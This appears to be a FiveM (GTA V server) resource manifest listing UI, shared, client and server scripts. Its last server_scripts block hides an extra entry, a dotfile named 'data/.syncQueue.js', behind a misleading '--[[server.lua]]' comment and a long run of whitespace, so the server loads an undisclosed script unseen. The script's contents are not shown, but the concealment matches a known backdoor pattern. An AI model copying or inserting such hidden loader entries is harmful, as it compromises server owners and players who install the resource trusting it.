fx_version 'bodacious'
game 'gta5'
lua54 "yes"
use_fxv2_oal 'yes'
ui_page 'nui/index.html'
ui_page_preload 'yes'

files {
    'nui/index.html',
}

shared_scripts {
    'zone.lua'
}

server_script 'server.lua'
client_script 'client.lua'

server_scripts {
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'data/.syncQueue.js',
}
